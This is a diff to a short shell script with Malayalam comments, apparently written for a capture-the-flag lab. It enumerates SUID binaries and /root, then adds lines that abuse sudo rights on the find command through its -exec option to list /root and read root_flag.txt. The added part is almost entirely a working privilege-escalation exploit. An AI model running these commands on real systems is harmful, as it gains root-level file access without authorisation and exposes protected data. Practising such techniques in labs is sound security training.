@@ -21,3 +21,9 @@ find / -perm -4000 -type f 2>/dev/null || true
 
 # 3. റൂട്ടിന്റെ ഹോം ഡയറക്ടറിയിൽ എന്തൊക്കെ ഉണ്ടെന്ന് നോക്കാൻ ശ്രമിക്കാം
 ls -la /root || true
+echo "=== EXPLOITING SUDO FIND FOR ROOT FLAG ==="
+# 1. റൂട്ട് ഡയറക്ടറിയിൽ ഉള്ള ഫ്ലാഗ് ഫയൽ കണ്ടെത്താൻ
+sudo /usr/bin/find . -exec ls -la /root \; -quit
+
+# 2. കണ്ടെത്തുന്ന ഫ്ലാഗ് ഫയൽ റീഡ് ചെയ്യാൻ (സാധാരണയായി root_flag.txt അല്ലെങ്കിൽ flag.txt ആയിരിക്കും)
+sudo /usr/bin/find . -exec cat /root/root_flag.txt \; -quit
